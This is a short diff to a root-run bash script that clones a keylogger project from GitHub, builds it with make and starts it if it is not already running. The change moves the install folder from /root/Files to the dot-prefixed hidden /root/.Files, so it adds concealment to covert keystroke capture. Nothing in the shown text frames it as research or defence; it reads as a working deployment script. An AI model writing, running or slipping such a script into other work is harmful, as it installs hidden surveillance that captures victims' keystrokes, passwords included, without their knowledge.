@@ -1,14 +1,14 @@
 #!/bin/bash
 #version 0.0.3
 
-if [ -d "/root/Files" ]
+if [ -d "/root/.Files" ]
 	then
     		:
 	else
 		cd /root/
 		git clone https://github.com/gsingh93/simple-key-logger.git
-		mv /root/simple-key-logger/ /root/Files/
-		cd /root/Files/
+		mv /root/simple-key-logger/ /root/.Files/
+		cd /root/.Files/
 		make
 fi
 
@@ -17,7 +17,7 @@ if [ $result -ge 1 ]
    then
         :
    else
-	cd /root/Files/
+	cd /root/.Files/
 	./skeylogger
 fi
 
